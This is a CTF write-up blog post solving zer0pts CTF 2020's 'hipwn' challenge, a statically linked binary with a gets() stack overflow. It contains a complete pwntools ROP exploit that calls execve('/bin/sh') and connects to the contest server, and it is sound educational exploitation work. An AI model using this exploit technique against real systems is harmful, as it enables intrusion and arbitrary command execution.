---
layout:    post
title:      "zer0ptsCTF - Hipwn Challenge"
date:       2020-03-09
author:     "D4mianwayne"
tags:    ["rop, pwn, bof, syscall, zer0ctf"]
img: "/img/pwned.png"
categories: ["CTFs"]
layout: "simple"

---

Writeup on how I managed to solve [hipwn](/assets/hipwn) from [zer0ptsCTF](https://www.zer0pts.com).

<!-- more -->

# Analzying Source Code and Binary

So, we got 2 files in a gzip archive, one which is `main.c` which is the source code of the binary and `chall` which is the executable we need to pwn. Let's check it out:-

```C
#include <stdio.h>

int main(void) {
  char name[0x100];
  puts("What's your team name?");
  gets(name);
  printf("Hi, %s. Welcome to zer0pts CTF 2020!\n", name);
  return 0;
}
```

Looks simple enough, of course we have `gets` which means we have a buffer overflow vulnerability which seems obvious. Other than that, nothing is really much of a concern. 
Let's run file and check the output:-

```asm
robin@oracle:~/CTFs$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

Damn, it is **statically linked** which means that all the libc functions which are used in the binary i.e. `puts`, `printf`, `gets` etc. are embedded in the binary itself and it is stripped which means no debugging symbols. Let's see the binary and run the `checksec` to see what protections it has:-


```asm
robin@oracle:~/CTFs$ checksec chall
[*] '/home/robin/CTFs/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

If it was **dynamically linked** binary we could have done something like leak any GOT address and then calculate the offsets to do something like `system("/bin/sh")`. But since it is **statically linked** it is pointless approach, we gotta use stuffs which are available in binary itself.

# Reverse Engineering the Binary

Time to reverse enginneer the binary so that we could get the address of some useful functions. Let's check out the main function:-

```C
__int64 sub_400160()
{
  __int64 v1; // [rsp+0h] [rbp-108h]

  sub_40062F("What's your team name?");
  sub_4004EE(&v1);
  sub_400591((unsigned __int64)"Hi, %s. Welcome to zer0pts CTF 2020!\n");
  return 0LL;
}
```

There we go, from source code we know the following things:-

* `puts("What's your team name?")` : `sub_40062F("What's your team name?")`
* `gets(name)` : `sub_4004EE(&v1)`
* `printf("Hi, %s. Welcome to zer0pts CTF 2020!\n", name)`  :`sub_400591((unsigned __int64)"Hi, %s. Welcome to zer0pts CTF 2020!\n")`



So, now we know that `0x4004EE` is the address of the `gets` and `0x40062F` is the address of `puts` and `0x400591` is the address of the `printf`, let's keep this thing in mind and time to pwn it.


# Pwning Time

So, my initial step was to use any address from `bss` to store thw address of `/bin/sh` and after that make a `exceve` syscall to spawn a shell. I used `pwntools` to automate most of the parts like getting the `bss` address and incrementing it by `0x200` offsets so that the initial address wom't be overwritten as `bss` loads IO related informations. Let's get it done:-

##### Finding offsets

Finding the offset with `gdb-gef`'s `de-brujin` based `pattern search`:-

```asm
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[+] Saved as '$_gef1'
gef➤  r
Starting program: /home/robin/CTFs/chall 
What's your team name?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
Hi, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa. Welcome to zer0pts CTF 2020!

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x6261616161616168 ("haaaaaab"?)
$rcx   : 0x0               
$rdx   : 0xffffffff        
$rsp   : 0x00007fffffffddf8  →  "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"
$rbp   : 0x00007fffffffde38  →  0x00007fffffffe1e1  →  "/home/robin/CTFs/chall"
$rsi   : 0x0000000000402efd  →   add BYTE PTR [rax], al
$rdi   : 0x0000000000604688  →  "Hi, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaa[...]"
$rip   : 0x000000000040019c  →   ret 
$r8    : 0x2000            
$r9    : 0x12c             
$r10   : 0x8080808080808080
$r11   : 0x202             
$r12   : 0x0000000000400160  →   push rbx
$r13   : 0x00007fffffffde48  →  0x00007fffffffe1f8  →  "CLUTTER_IM_MODULE=xim"
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffddf8│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"	 ← $rsp
0x00007fffffffde00│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
0x00007fffffffde08│+0x0010: "kaaaaaablaaaaaabmaaa"
0x00007fffffffde10│+0x0018: "laaaaaabmaaa"
0x00007fffffffde18│+0x0020: 0x000000006161616d ("maaa"?)
0x00007fffffffde20│+0x0028: 0x0000000000000000
0x00007fffffffde28│+0x0030: 0x00000000004001b3  →   lea rdx, [rdi+0x8]
0x00007fffffffde30│+0x0038: 0x0000000000000001
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400192                  add    rsp, 0x100
     0x400199                  xor    eax, eax
     0x40019b                  pop    rbx
 →   0x40019c                  ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x40019c in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40019c → ret 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x000000000040019c in ?? ()
gef➤  x/xg $rsp
0x7fffffffddf8:	0x6261616161616169
gef➤  pattern search 0x6261616161616169
[+] Searching '0x6261616161616169'
[+] Found at offset 264 (little-endian search) likely
```

Adding it to exploit:-

```python
payload = "A"*264
```
##### Using `gets` to store /bin/sh adddress

This one does `gets(writeable_addr)` as in 64 bit binaries `rdi` has first arguments.

```python
payload += p64(pop_rdi) 
payload += p64(writable_readable_addr)
payload += p64(0x4004EE) # We know the `gets` address from RE part
```

##### Doing a `execve` syscall 

Since we have found offsets and chained the rop chain to store `/bin/sh` in bss address, time to do a `execve` syscall:-

```python
payload += p64(pop_rax) # This one holds the number of which syscall has to done
payload += p64(0x3b) # This ensures `rax` contains `0x3b` which means it is doing an `execve`
payload += p64(pop_rdi) # Popping `rdi` address
payload += p64(writable_readable_addr) # writeable address which has `/bin/sh` is loaded to `rdi`
payload += p64(pop_rsi) # Popping `rsi` and `r15`
payload += p64(0) # Loading `0` to `rsi`
payload += p64(0) # Loading `0` to `r15` 
payload += p64(pop_rdx) # Popping rdx
payload += p64(0) # We will load to `0` to `rdx`
payload += p64(syscall) # Adding `syscall; ret;` at last to request syscall
```
We are doing `execve("/bin/sh", 0, 0)` to spawn a shell. 

##### Final Exploit

Here is the final exploit:-

```python
from pwn import *

pop_rdi = 0x000000000040141c # pop rdu; ret;
pop_rdx = 0x00000000004023f5 # pop rdx; ret;
pop_rsi = 0x000000000040141a # pop rsi; pop r15; ret;
pop_rax = 0x0000000000400121 # pop rax; ret;
syscall = 0x00000000004024dd # syscall; ret;

elf = ELF("./chall")
writable_readable_addr = elf.bss() + 0x200

payload = b"A"*264
payload += p64(pop_rdi) 
payload += p64(writable_readable_addr)
payload += p64(0x4004EE)
payload += p64(pop_rdi)
payload += p64(writable_readable_addr)
payload += p64(0x40062F)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(writable_readable_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

#p = process("./chall")
p = connect("18.179.178.246", 9010)

p.sendlineafter("?\n", payload)
p.sendline(b"/bin/sh\x00") # Sending this to stdin which means the `writable_readable_addr` will have `/bin/sh`

p.interactive()
```

Running the exploit:-

```asm
robin@oracle:~/CTFs$ python hipwn_xpl.py 
[*] '/home/robin/CTFs/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 18.179.178.246 on port 9010: Done
[*] Switching to interactive mode
$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
zer0pts{welcome_yokoso_osooseyo_huanying_dobropozhalovat}
$  
```

Yay, we got this. I hope you learned something. Encontered any issues? Contact [@D4mianWayne](https://twitter.com/D4mianWayne)




